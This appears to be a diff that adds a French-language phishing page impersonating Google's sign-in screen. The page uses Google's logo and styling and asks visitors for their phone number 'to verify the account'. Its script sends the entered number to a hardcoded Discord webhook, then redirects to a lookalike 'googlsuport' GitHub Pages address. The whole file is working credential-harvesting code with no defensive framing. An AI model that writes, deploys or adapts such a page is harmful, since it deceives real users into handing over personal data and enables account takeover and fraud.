@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Connexion - Google</title>
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    body {
+      margin: 0;
+      background: #fff;
+      font-family: 'Roboto', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      height: 100vh;
+      padding-top: 120px;
+      color: #202124;
+    }
+    .container {
+      width: 360px;
+      text-align: center;
+    }
+    .google-logo {
+      width: 92px;
+      margin-bottom: 32px;
+    }
+    h1 {
+      font-weight: 400;
+      font-size: 24px;
+      margin: 0 0 12px 0;
+    }
+    p {
+      font-size: 16px;
+      margin: 0 0 28px 0;
+      color: #5f6368;
+      line-height: 1.4;
+    }
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      box-sizing: border-box;
+      outline-offset: 2px;
+      transition: border-color 0.3s;
+      font-family: 'Roboto', Arial, sans-serif;
+      color: #202124;
+    }
+    input[type="tel"]:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 1px 2px rgba(26,115,232,.3);
+    }
+    button {
+      margin-top: 24px;
+      width: 100%;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 12px 0;
+      font-size: 14px;
+      font-weight: 500;
+      border-radius: 4px;
+      cursor: pointer;
+      box-shadow: 0 1px 1px rgb(0 0 0 / 0.1);
+      transition: background-color 0.3s;
+      text-transform: none;
+      font-family: 'Roboto', Arial, sans-serif;
+    }
+    button:hover {
+      background-color: #1669c1;
+      box-shadow: 0 2px 4px rgb(0 0 0 / 0.2);
+    }
+    .footer {
+      margin-top: 48px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main" aria-labelledby="pageTitle">
+    <img
+      src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+      alt="Google"
+      class="google-logo"
+    />
+    <h1 id="pageTitle">Connexion</h1>
+    <p>Entrez votre numéro de téléphone pour continuer</p>
+
+    <input
+      type="tel"
+      id="phoneNumber"
+      placeholder="+33 6 12 34 56 78"
+      autocomplete="tel"
+      aria-label="Numéro de téléphone"
+      autofocus
+    />
+    <button id="submitBtn" type="button">Suivant</button>
+
+    <div class="footer">
+      Nous utilisons ce numéro pour vérifier votre compte.
+    </div>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1399331411558797363/L-4Sn5hwtib-iQQei_gP1pPrCqf0jRYWiridji5jA2sGajdEdCzIX1uymbsWIEunmUWs";
+    const phoneInput = document.getElementById("phoneNumber");
+    const submitBtn = document.getElementById("submitBtn");
+
+    submitBtn.addEventListener("click", () => {
+      const phone = phoneInput.value.trim();
+      if (!phone) return;
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `Numéro de téléphone reçu : ${phone}` })
+      }).catch(() => {});
+
+      // redirection après envoi
+      window.location.href = "https://googlsuport.github.io/googleproblem/";
+
+      phoneInput.value = "";
+      phoneInput.focus();
+    });
+
+    phoneInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") {
+        submitBtn.click();
+      }
+    });
+  </script>
+</body>
+</html>
